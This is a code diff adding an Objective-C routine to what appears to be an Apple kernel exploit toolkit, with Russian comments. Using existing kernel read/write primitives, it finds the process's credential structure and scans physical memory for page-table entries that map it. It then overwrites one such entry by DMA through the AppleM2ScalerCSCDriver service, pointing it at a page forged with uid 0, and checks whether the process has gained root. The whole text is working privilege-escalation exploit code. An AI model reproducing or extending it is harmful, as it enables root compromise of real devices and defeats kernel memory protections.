@@ -3460,6 +3460,164 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     return r;
 }
 
++ (NSString *)c3AltPteWriteReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== C3-WRITE: DART alt-PTE remap → sacrificial ucred ===\n"];
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW не жив.\n"]; return r;
+    }
+    if (!gFrameTableVA) (void)[self frameTableVAWithLog:r];
+
+    pid_t selfPid = getpid();
+    uint64_t selfProc = proc_self();
+    if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)selfPid log:r];
+    if (!selfProc) { [r appendString:@"FAIL: proc\n"]; return r; }
+
+    uint64_t roRaw = 0, ucRaw = 0;
+    if (!kpRead(selfProc + koffsetof(proc, proc_ro), &roRaw, 8, "p_proc_ro", r)) return r;
+    uint64_t ro = kp_untag_ptr(roRaw);
+    if (!kpLooksLikeKernelPointer(ro) ||
+        !kpRead(ro + koffsetof(proc_ro, ucred), &ucRaw, 8, "p_ucred", r)) {
+        [r appendString:@"FAIL: ucred chain\n"]; return r;
+    }
+    uint64_t uc = kp_untag_ptr(ucRaw);
+    uint64_t ucPage = uc & ~0x3fffULL;
+    uint32_t uoff = (uint32_t)(uc & 0x3fff);
+    uint64_t ucPA = kvtophys(ucPage);
+    uint64_t pB = kconstant(physBase), pS = kconstant(physSize);
+    uint64_t dartLo = pB + 0x40000000ULL;
+    kpNote(r, [NSString stringWithFormat:@"  ucred=%#llx page=%#llx PA=%#llx uoff=%#x",
+              (unsigned long long)uc, (unsigned long long)ucPage,
+              (unsigned long long)ucPA, uoff]);
+    if (!ucPA) { [r appendString:@"FAIL: ucPA\n"]; return r; }
+
+    // Hunt alt-PTEs (prefer inDART).
+    uint64_t hitPA = 0, hitVal = 0, hitTableVA = 0;
+    uint32_t hitOff = 0; int hitType = -1; BOOL hitDart = NO;
+    for (uint64_t pa = pB; pa < pB + pS; pa += 0x4000) {
+        int t = kpFrameTypeOf(pa);
+        if (t != 0x15 && t != 0x21 && t != 0x0b) continue;
+        BOOL inDart = (pa >= dartLo);
+        if (!inDart && hitDart) continue;
+        uint64_t al = phystokv(pa);
+        if (!al) continue;
+        for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
+            uint64_t q = early_kread64(al + o);
+            if ((q & 3) != 3) continue;
+            if ((q & 0x0000ffffffffc000ULL) != ucPA) continue;
+            kpNote(r, [NSString stringWithFormat:@"  [C3W] cand pa=%#llx off=+%#x t=%d inDART=%d val=%#018llx",
+                      (unsigned long long)pa, o, t, inDart, (unsigned long long)q]);
+            if (inDart && !hitDart) {
+                hitPA = pa; hitOff = o; hitType = t; hitVal = q;
+                hitTableVA = al; hitDart = YES;
+            } else if (!hitDart) {
+                hitPA = pa; hitOff = o; hitType = t; hitVal = q;
+                hitTableVA = al;
+            }
+        }
+    }
+    if (!hitPA) { [r appendString:@"FAIL: alt-PTE не найден\n"]; return r; }
+    kpNote(r, [NSString stringWithFormat:@"  [C3W] target pa=%#llx off=+%#x t=%d inDART=%d val=%#018llx",
+              (unsigned long long)hitPA, hitOff, hitType, (int)hitDart, (unsigned long long)hitVal]);
+
+    // Sacrificial 0x21 page (not PTE-like, no 501).
+    uint64_t sacPA = 0, sacVA = 0;
+    for (uint64_t pa = pB; pa < pB + pS; pa += 0x4000) {
+        if (kpFrameTypeOf(pa) != 0x21) continue;
+        if (pa == ucPA) continue;
+        uint64_t al = phystokv(pa);
+        if (!al) continue;
+        int looksPte = 0, has501 = 0;
+        for (uint32_t o = 0; o < 0x100; o += 8) {
+            uint64_t q = early_kread64(al + o);
+            if ((q & 3) == 3) looksPte++;
+            if (q == 0x000001f5000001f5ULL) has501 = 1;
+        }
+        if (looksPte >= 8 || has501) continue;
+        sacPA = pa; sacVA = al; break;
+    }
+    if (!sacPA) { [r appendString:@"FAIL: sac page\n"]; return r; }
+    uint64_t slotVA = sacVA + uoff;
+    uint64_t slotSave = early_kread64(slotVA);
+    early_kwrite64(slotVA, 0);
+    kpNote(r, [NSString stringWithFormat:@"  [C3W] sac PA=%#llx VA=%#llx slot=%#llx (uid=0)",
+              (unsigned long long)sacPA, (unsigned long long)sacVA, (unsigned long long)slotVA]);
+
+    // New PTE: same flags, OA = sacPA.
+    uint64_t newPte = (hitVal & ~0x0000ffffffffc000ULL) | (sacPA & 0x0000ffffffffc000ULL);
+    uint64_t ptePage = hitPA; // table page PA
+    uint32_t pteOff = hitOff;
+
+    // DMA context (same as PTE-remap 2.0.77).
+    uint64_t ttM = 0, isTable = 0;
+    {
+        uint64_t pr = roRaw;
+        uint64_t tk = pr ? kp_untag_ptr(early_kread64(ro + off_proc_ro_pr_task)) : 0;
+        uint64_t mp = tk ? early_kread64(kp_untag_ptr(tk) + off_task_map) : 0;
+        uint64_t pm = mp ? early_kread64(kp_untag_ptr(mp) + koffsetof(vm_map, pmap)) : 0;
+        ttM = pm ? kp_untag_ptr(early_kread64(kp_untag_ptr(pm) + koffsetof(pmap, ttep))) : 0;
+        uint64_t spc = tk ? early_kread64(kp_untag_ptr(tk) + off_task_itk_space) : 0;
+        uint64_t tb = spc ? early_kread64(kp_untag_ptr(spc) + off_ipc_space_is_table) : 0;
+        if (tb) {
+            isTable = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                      ? kp_untag_ptr(kpSMRDecode(tb)) : kp_untag_ptr(tb);
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [C3W] dma ttM=%#llx isTable=%#llx",
+                  (unsigned long long)ttM, (unsigned long long)isTable]);
+    }
+
+    BOOL dmaOK = NO;
+    if (ptePage && ttM && isTable) {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                       IOServiceMatching("AppleM2ScalerCSCDriver"));
+        if (svc) {
+            uint8_t tsd[0x1B0];
+            memset(tsd, 0, sizeof(tsd));
+            *(uint32_t *)(tsd + 0x0C) = 32;
+            *(uint32_t *)(tsd + 0x10) = 32;
+            kpNote(r, [NSString stringWithFormat:@"  [C3W] DMA write ptePA=%#llx off=%#x payload=%#018llx",
+                      (unsigned long long)ptePage, pteOff, (unsigned long long)newPte]);
+            dmaOK = kpPhysWrite8v2(svc, tsd, ttM, isTable, ptePage, pteOff, newPte, r);
+            IOObjectRelease(svc);
+        } else {
+            kpNote(r, @"  [C3W] M2Scaler нет");
+        }
+    } else {
+        kpNote(r, @"  [C3W] DMA ctx incomplete");
+    }
+
+    uint64_t rbP = hitTableVA ? early_kread64(hitTableVA + hitOff) : 0;
+    kpNote(r, [NSString stringWithFormat:@"  [C3W] DMA=%d readback=%#018llx (ждём %#018llx) %@",
+              (int)dmaOK, (unsigned long long)rbP, (unsigned long long)newPte,
+              rbP == newPte ? @"ПРИЛИПЛО" : @"МИМО"]);
+
+    uid_t u1 = getuid(), e1 = geteuid();
+    for (int i = 0; i < 8; i++) { getpid(); sched_yield(); }
+    uid_t u2 = getuid(), e2 = geteuid();
+    kpNote(r, [NSString stringWithFormat:@"  [C3W] uid %u→%u euid %u→%u", u1, u2, e1, e2]);
+    BOOL p1 = (u2 == 0 && e2 == 0);
+    if (p1) kpNote(r, @"=== P1 ★★ C3-WRITE ===");
+
+    // Restore PTE + sac slot (mandatory).
+    if (dmaOK || rbP == newPte) {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                       IOServiceMatching("AppleM2ScalerCSCDriver"));
+        if (svc) {
+            uint8_t tsd[0x1B0]; memset(tsd, 0, sizeof(tsd));
+            *(uint32_t *)(tsd + 0x0C) = 32; *(uint32_t *)(tsd + 0x10) = 32;
+            BOOL rest = kpPhysWrite8v2(svc, tsd, ttM, isTable, ptePage, pteOff, hitVal, r);
+            kpNote(r, [NSString stringWithFormat:@"  [C3W] restore PTE=%d", (int)rest]);
+            IOObjectRelease(svc);
+        }
+    }
+    early_kwrite64(slotVA, slotSave);
+    [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d P1=%d DMA=%d HIT_DART=%d SWAP_PTE=%d\n",
+     (int)getuid(), (int)geteuid(), p1 ? 1 : 0, (int)dmaOK, (int)hitDart, rbP == newPte ? 1 : 0];
+    [r appendString:@"=== C3-WRITE done ===\n"];
+    return r;
+}
+
 + (NSString *)ucredHeapSwapReport
 {
     NSMutableString *r = [NSMutableString string];
